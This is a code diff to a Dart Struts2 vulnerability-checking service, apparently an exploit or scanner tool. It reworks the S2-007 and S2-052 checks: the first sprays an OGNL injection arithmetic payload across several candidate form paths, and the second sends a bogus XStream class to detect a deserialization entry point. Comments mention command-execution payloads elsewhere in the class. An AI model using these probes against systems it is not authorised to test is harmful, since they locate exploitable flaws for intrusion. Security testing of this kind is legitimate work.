@@ -356,33 +356,47 @@ class Struts2ExpService {
   //   1. 命令用 new String[]{} 数组形式，避免 exec(String) 空格拆分问题。
   //   2. 单引号/反斜杠先做 OGNL 转义再 URL 编码，顺序不可颠倒。
   //   3. 用哨兵标记从 HTML 噪声中精确提取命令输出。
-  Future<ExpResult> checkS2007({
-    String path = 'login.action',
-    String field = 'age',
-  }) async {
+  Future<ExpResult> checkS2007({String path = '', String field = 'age'}) async {
+    // 目标应用的表单路径/字段名各不相同（vulhub 靶场是 /user.action + name/email/age，
+    // 也有 login.action + username/password 的写法），逐个候选尝试。
+    final paths = <String>{
+      if (path.isNotEmpty) path,
+      'user.action',
+      'login.action',
+      'index.action',
+      '',
+    };
+    final forms = <Map<String, String>>[
+      {'name': 'x', 'email': 'x', field: "' + 233*233 + '"},
+      {'username': 'x', 'password': 'x', field: "' + 233*233 + '"},
+    ];
     try {
-      final uri = baseUri.resolve(path);
-      // 233*233=54289，验证 OGNL 求值结果是否出现在响应体
-      final payload = "' + 233*233 + '";
-      final res = await http
-          .post(
-            uri,
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'username=x&password=x&$field=${Uri.encodeQueryComponent(payload)}',
-          )
-          .timeout(timeout);
-      if (looksLikeWafBlock(res.statusCode, res.body)) {
-        return ExpResult.probeFailed(
-          'S2-059 (CVE-2019-0230)',
-          '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
-        );
-      }
-      if (res.body.contains('54289')) {
-        return ExpResult(
-          true,
-          'S2-007',
-          '类型转换 OGNL 注入，233×233=54289 已出现在响应体',
-        );
+      for (final p in paths) {
+        final uri = baseUri.resolve(p);
+        for (final form in forms) {
+          final res = await http
+              .post(
+                uri,
+                headers: {
+                  'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: form,
+              )
+              .timeout(timeout);
+          if (looksLikeWafBlock(res.statusCode, res.body)) {
+            return ExpResult.probeFailed(
+              'S2-007',
+              '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
+            );
+          }
+          if (res.body.contains('54289')) {
+            return ExpResult(
+              true,
+              'S2-007',
+              '类型转换 OGNL 注入，233×233=54289 已出现在响应体 (路径: ${p.isEmpty ? '/' : p})',
+            );
+          }
+        }
       }
     } catch (e) {
       return ExpResult.probeFailed('S2-007', '探测失败: $e');
@@ -395,22 +409,32 @@ class Struts2ExpService {
   // 盲注：ProcessBuilder 执行命令，无直接回显。
   // Bug 预防：命令放在 XML <string> 节点中，需 XML 转义 (&amp; &lt; 等)。
   Future<ExpResult> checkS2052({String path = 'orders/3/edit'}) async {
+    // 旧实现只要端点不返 404/415 就判定"可能存在"，任何 REST 端点都会命中。
+    // 改为确认 **XStream 反序列化** 特征：发送一个不存在的类，若响应出现
+    // com.thoughtworks.xstream / CannotResolveClassException，说明 XML 被
+    // XStream 解析（CVE 的充分前提）。
+    final uri = baseUri.resolve(path);
     try {
-      final uri = baseUri.resolve(path);
-      // 发送最小 XStream XML，探测 REST plugin 是否存在（非 404/415）
-      const probeXml = '<map><entry><string>probe</string><string>54289</string></entry></map>';
       final res = await http
           .post(
             uri,
             headers: {'Content-Type': 'application/xml'},
-            body: probeXml,
+            body: '<foo.Bar/>',
           )
           .timeout(timeout);
-      if (res.statusCode != 404 && res.statusCode != 415 && res.statusCode != 406) {
+      if (looksLikeWafBlock(res.statusCode, res.body)) {
+        return ExpResult.probeFailed(
+          'S2-052',
+          '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
+        );
+      }
+      final body = res.body.toLowerCase();
+      if (body.contains('com.thoughtworks.xstream') ||
+          body.contains('cannotresolveclassexception')) {
         return ExpResult(
           true,
           'S2-052',
-          'REST Plugin 端点可达 (HTTP ${res.statusCode})，XStream 反序列化可能存在',
+          'REST 端点使用 XStream 反序列化 XML（HTTP ${res.statusCode}），确认存在反序列化入口',
         );
       }
     } catch (e) {
